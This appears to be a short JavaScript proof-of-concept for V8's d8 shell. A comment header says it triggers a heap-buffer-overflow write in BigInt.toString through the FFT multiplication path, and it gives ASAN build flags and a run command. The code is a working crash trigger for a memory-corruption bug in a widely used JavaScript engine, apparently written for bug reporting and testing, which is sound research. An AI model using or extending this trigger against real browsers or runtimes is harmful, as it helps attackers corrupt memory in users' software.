// ============================================================================
// PoC: ASAN heap-buffer-overflow via toString -> NormalizeAndRecombine
// ============================================================================
//
// This PoC triggers an ASAN heap-buffer-overflow WRITE via BigInt.toString(10),
// which calls CreateLevels -> Multiply (squaring) -> MultiplyFFT ->
// NormalizeAndRecombine.
//
// BUILD: is_asan=true, v8_enable_sandbox=false, v8_advanced_bigint_algorithms=true
// RUN:   ./d8 poc/poc_asan_tostring_oob.js
//
// ============================================================================

const x = 123456n;
const a = 31337n ** x;

try {
  const s = a.toString(10);
  print("toString completed (OOB not detected)");
} catch (e) {
  print("Exception: " + e);
}
